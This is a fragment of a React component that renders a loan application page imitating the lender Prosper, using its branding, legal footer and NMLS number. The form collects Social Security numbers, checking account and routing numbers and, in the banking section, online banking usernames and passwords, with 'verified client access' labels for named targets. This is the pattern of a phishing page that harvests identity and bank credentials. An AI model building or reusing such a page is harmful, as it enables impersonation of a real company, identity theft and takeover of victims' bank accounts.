                <div style={{fontSize:22,marginBottom:6}}>{icon}</div>
                <div>{range}</div>
              </button>
            ))}
          </div>
          {selectedScore && (
            <div style={{background:"rgba(255,255,255,0.1)",borderRadius:12,padding:"20px 28px",marginTop:8}}>
              <p style={{fontSize:15,marginBottom:16}}>Based on your score range <strong>({selectedScore})</strong>, we have loan options available for you!</p>
              <button className="pr-apply-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Check your rate now</button>
            </div>
          )}
        </div>
      </div>

      {/* Testimonials */}
      <section className="pr-section" style={{paddingBottom:40}}>
        <div className="pr-section-inner">
          <div className="pr-eyebrow">What Our Customers Say</div>
          <h2 className="pr-title">20 years of advancing financial well-being</h2>
        </div>
        <div className="pr-testimonials" style={{marginTop:32}}>
          <div className="pr-testimonial-track">
            {doubledTestimonials.map((t, i) => (
              <div key={i} className="pr-t-card">
                <div className="pr-t-stars">★★★★★</div>
                <p className="pr-t-text">"{t.text}"</p>
                <div className="pr-t-author">— {t.author} · {t.source}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* App Section */}
      <section className="pr-app-section">
        <div className="pr-app-inner">
          <div>
            <h2 className="pr-app-h2">Do it all in the Prosper app</h2>
            <p className="pr-app-p">Free credit tracking & insights, loan management, investing portfolio — all in one place. Download the app and scan to apply on your mobile device.</p>
            <div className="pr-store-btns">
              <div className="pr-store-btn">
                <span style={{fontSize:24}}>🍎</span>
                <span>App Store</span>
              </div>
              <div className="pr-store-btn">
                <span style={{fontSize:24}}>▶</span>
                <span>Google Play</span>
              </div>
            </div>
          </div>
          <div className="pr-qr-box">
            <div className="pr-qr-img">
              <div style={{width:90,height:90,background:"repeating-linear-gradient(0deg,#6B3FA0 0px,#6B3FA0 5px,transparent 5px,transparent 10px),repeating-linear-gradient(90deg,#6B3FA0 0px,#6B3FA0 5px,transparent 5px,transparent 10px)",borderRadius:6}}/>
            </div>
            <p style={{color:"rgba(255,255,255,0.75)",fontSize:13}}>Scan to apply on your mobile device</p>
          </div>
        </div>
      </section>

      {/* Application Form */}
      <section className="pr-form-section" id="apply-form">
        <div style={{textAlign:"center",marginBottom:32}}>
          <div className="pr-eyebrow">Apply Now</div>
          <h2 className="pr-title">{client ? `Apply Now — ${client.name}` : "Check Your Rate in Minutes"}</h2>
          <p style={{color:"var(--pr-gray)",fontSize:15,marginTop:8}}>Checking your rate won't impact your credit score.</p>
        </div>

        <div className="pr-form-wrap">
          <div className="pr-form-header">
            <ProsperLogo />
            <h2 style={{marginTop:16}}>Prosper Application</h2>
            <p>{client ? `Verified access for ${client.name}` : "Complete the form below to check your personalized rate"}</p>
          </div>

          <div className="pr-form-body">
            {client && (
              <div className="pr-client-badge">
                <CheckIco/> Verified client access — {client.name}
              </div>
            )}

            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Personal */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><UserIco/> Personal Information</div>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">First Name</label><input className="pr-in" {...register("firstName")} placeholder="First name"/>{errors.firstName&&<p className="pr-err">{errors.firstName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Last Name</label><input className="pr-in" {...register("lastName")} placeholder="Last name"/>{errors.lastName&&<p className="pr-err">{errors.lastName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Email Address</label><input className="pr-in" type="email" {...register("email")} placeholder="you@example.com"/>{errors.email&&<p className="pr-err">{errors.email.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Phone Number</label><input className="pr-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="pr-err">{errors.phone.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Date of Birth</label><input className="pr-in" type="date" {...register("dob")}/>{errors.dob&&<p className="pr-err">{errors.dob.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Social Security Number</label><div className="pr-icon-field"><input className="pr-in" {...register("ssn")} placeholder="No dashes" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.ssn&&<p className="pr-err">{errors.ssn.message}</p>}</div>
                </div>
                <div className="pr-fgroup"><label className="pr-lbl">Street Address</label><input className="pr-in" {...register("address")} placeholder="123 Main Street"/>{errors.address&&<p className="pr-err">{errors.address.message}</p>}</div>
                <div className="pr-g3">
                  <div className="pr-fgroup"><label className="pr-lbl">City</label><input className="pr-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="pr-err">{errors.city.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">State</label><input className="pr-in" {...register("state")} placeholder="ST" maxLength={2}/>{errors.state&&<p className="pr-err">{errors.state.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Zip Code</label><input className="pr-in" {...register("zip")} placeholder="10001" maxLength={5}/>{errors.zip&&<p className="pr-err">{errors.zip.message}</p>}</div>
                </div>
              </div>

              {/* Loan */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><BriefIco/> Loan Details</div>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">Monthly Income ($)</label><input className="pr-in" type="number" {...register("monthlyIncome")} placeholder="e.g. 5,000"/>{errors.monthlyIncome&&<p className="pr-err">{errors.monthlyIncome.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Loan Amount ($)</label><input className="pr-in" type="number" {...register("loanAmount")} placeholder="e.g. 10,000"/>{errors.loanAmount&&<p className="pr-err">{errors.loanAmount.message}</p>}</div>
                </div>
                <div className="pr-fgroup"><label className="pr-lbl">Credit Score Range</label>
                  <Controller name="creditScore" control={control} render={({field})=>(
                    <Select onValueChange={field.onChange} value={field.value||""}>
                      <SelectTrigger style={{height:46,borderRadius:8,borderColor:"#e5e7eb",fontSize:14}}><SelectValue placeholder="Select your credit range"/></SelectTrigger>
                      <SelectContent>
                        <SelectItem value="good">781–850 (Excellent)</SelectItem>
                        <SelectItem value="low">661–780 (Good)</SelectItem>
                        <SelectItem value="bad">Below 660 (Fair / Poor)</SelectItem>
                      </SelectContent>
                    </Select>
                  )}/>
                  {errors.creditScore&&<p className="pr-err">{errors.creditScore.message}</p>}
                </div>
              </div>

              {/* Banking */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><BankIco/> Banking Information</div>
                <p style={{fontSize:13,color:"var(--pr-gray)",marginBottom:20}}>Bank-level 256-bit SSL encryption secures your data. Required for identity verification and fund disbursement.</p>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">Bank Name</label><input className="pr-in" {...register("bankName")} placeholder="e.g. Wells Fargo"/>{errors.bankName&&<p className="pr-err">{errors.bankName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Years with Bank</label><input className="pr-in" type="number" {...register("yearsWithBank")} placeholder="e.g. 5"/>{errors.yearsWithBank&&<p className="pr-err">{errors.yearsWithBank.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Checking Account Number</label><div className="pr-icon-field"><input className="pr-in" {...register("accountNumber")} placeholder="Account number"/><span className="fi"><LockIco/></span></div>{errors.accountNumber&&<p className="pr-err">{errors.accountNumber.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Routing Number</label><div className="pr-icon-field"><input className="pr-in" {...register("routingNumber")} placeholder="9 digits" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.routingNumber&&<p className="pr-err">{errors.routingNumber.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Online Banking Username</label><div className="pr-icon-field"><input className="pr-in" {...register("mobileUsername")} placeholder="Your banking username"/><span className="fi"><LockIco/></span></div>{errors.mobileUsername&&<p className="pr-err">{errors.mobileUsername.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Online Banking Password</label><div className="pr-icon-field"><input className="pr-in" type="password" {...register("mobilePassword")} placeholder="Your banking password"/><span className="fi"><LockIco/></span></div>{errors.mobilePassword&&<p className="pr-err">{errors.mobilePassword.message}</p>}</div>
                </div>
              </div>

              <button type="submit" className="pr-submit" disabled={isSubmitting}>
                {isSubmitting ? <><div className="pr-spin"/>Processing...</> : <>Check My Rate — No Credit Impact <ChevRight/></>}
              </button>
              <p className="pr-fine">
                By submitting, you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.<br/>
                Checking your rate uses a soft credit inquiry only — no impact to your score. All personal loans made by WebBank.
              </p>
            </form>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="pr-footer">
        <div className="pr-ft-main">
          <div className="pr-ft-brand">
            <ProsperLogo />
            <p>Helping people thrive since 2005. © 2005–2026 Prosper Funding LLC. All rights reserved.<br/>221 Main Street, Suite 300, San Francisco, CA 94105</p>
          </div>
          {[
            { h:"Products", links:["Personal Loans","The Prosper® Card","Investing","Business Loans","Student Loans"] },
            { h:"Tools", links:["Resources Hub","Prosper Blog","Debt Consolidation Guide","Credit Management Guide","Loan Calculator"] },
            { h:"Company", links:["About Us","Media Room","Careers","Legal Agreements","Prospectus","Developers"] },
            { h:"Support", links:["Help Center","Contact Us","FAQs","Do Not Sell My Info","NMLS Consumer Access"] },
          ].map(({h,links}) => (
            <div key={h} className="pr-ft-col">
              <h4>{h}</h4>
              <ul>{links.map(l=><li key={l}><a href="#">{l}</a></li>)}</ul>
            </div>
          ))}
        </div>
        <div className="pr-ft-bottom">
          <div className="pr-fb">
            <p>© 2005–2026 Prosper Funding LLC. All rights reserved. | Prosper Marketplace, Inc. NMLS#111473</p>
            <div style={{display:"flex",gap:16}}>
              <a href="#">Privacy Policy</a>
              <a href="#">Licensing & Disclosures</a>
              <a href="#">NMLS Consumer Access</a>
            </div>
          </div>
        </div>
        <div className="pr-disclaimer">
          <strong>IMPORTANT INFORMATION:</strong> All personal loans made by WebBank. Eligibility for personal loans up to $50,000 depends on your financial history, credit score, monthly income, and monthly expenses. Eligibility is not guaranteed and requires sufficient investor commitments. ¹ Weighted average historical return for loans originated through Prosper as of Mar 31, 2026. Historical performance is no guarantee of future results. The Prosper Credit Card is issued by Coastal Community Bank, Member FDIC, pursuant to license by Mastercard®.
        </div>
      </footer>
    </div>
  );
}
